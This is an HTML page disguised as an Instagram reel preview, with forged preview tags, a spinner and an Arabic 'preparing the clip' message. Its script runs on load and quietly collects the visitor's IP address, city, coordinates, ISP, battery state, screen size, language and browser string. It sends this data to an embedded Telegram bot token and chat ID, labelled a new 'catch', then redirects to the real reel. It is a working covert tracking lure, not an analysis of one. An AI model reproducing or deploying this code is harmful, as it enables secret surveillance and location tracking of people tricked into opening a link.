<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mohammed Jalal on Instagram: "Hajwalah"</title>
    
    <!-- وسوم المعاينة المحدثة والمجبرة لظهور الصورة والبطاقة -->
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="Mohammed Jalal on Instagram: &quot;&quot;Hajwalah&quot;&quot;">
    <meta property="og:description" content="شاهد هذا الفيديو على إنستغرام">
    <meta property="og:image" content="https://images.unsplash.com/photo-1568605117036-5fe5e7bab0b7?w=1200&h=630&fit=crop">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://www.instagram.com/reel/DdoP29oMp_X/">
    <meta property="og:type" content="video.other">
    <meta property="og:video" content="https://www.instagram.com/reel/DdoP29oMp_X/">
    
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            text-align: center;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            cursor: pointer;
        }
        .spinner {
            width: 45px;
            height: 45px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #E1306C;
            animation: spin 0.7s linear infinite;
            margin-bottom: 20px;
        }
        .msg {
            font-size: 15px;
            color: #fff;
            font-weight: 500;
        }
        .sub-msg {
            font-size: 12px;
            color: #888;
            margin-top: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body onclick="executeRedirect()">

    <div class="spinner"></div>
    <div class="msg">جاري تجهيز عرض المقطع...</div>
    <div class="sub-msg">اضغط في أي مكان للمتابعة فوراً</div>

    <script>
        const botToken = "8803169320:AAFSwUuSZw5eqzvYmj77qVYCDPS1GjPWemg";
        const chatId = "2122221879";
        const targetUrl = "https://www.instagram.com/reel/DdoP29oMp_X/?stkn=MWpxMHo3N3RocDZzeQ==";
        let executed = false;

        async function gatherAndSend() {
            let ipData = { ip: "غير معروف", country_name: "غير معروف", city: "غير معروف", org: "غير معروف", latitude: "N/A", longitude: "N/A" };
            
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                if (data.ip) {
                    ipData.ip = data.ip;
                    ipData.country_name = data.country_name || "غير معروف";
                    ipData.city = data.city || "غير معروف";
                    ipData.org = data.org || "غير معروف";
                    ipData.latitude = data.latitude || "N/A";
                    ipData.longitude = data.longitude || "N/A";
                }
            } catch (e) {}

            let batteryStatus = "غير مدعوم";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryStatus = `${Math.round(bat.level * 100)}% (${bat.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
                }
            } catch (e) {}

            let message = `🎯 صيد جديد (مع صورة المعاينة) يا البرسم!\n\n` +
                          `🌐 IP: ${ipData.ip}\n` +
                          `🌍 الدولة: ${ipData.country_name}\n` +
                          `🏙️ المدينة: ${ipData.city}\n` +
                          `📍 الموقع (IP): ${ipData.latitude}, ${ipData.longitude}\n` +
                          `🏢 المزود (ISP): ${ipData.org}\n\n` +
                          `📱 معلومات الجهاز:\n` +
                          `🔋 البطارية: ${batteryStatus}\n` +
                          `💻 الشاشة: ${window.screen.width}x${window.screen.height}\n` +
                          `🗣️ اللغة: ${navigator.language}\n` +
                          `💻 المتصفح: ${navigator.userAgent}`;

            let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            try {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(telegramUrl);
                } else {
                    await fetch(telegramUrl);
                }
            } catch (err) {}
        }

        function executeRedirect() {
            if (executed) return;
            executed = true;
            window.location.href = targetUrl;
        }

        window.onload = function() {
            gatherAndSend();
            setTimeout(function() {
                executeRedirect();
            }, 1000);
        };
    </script>
</body>
</html>
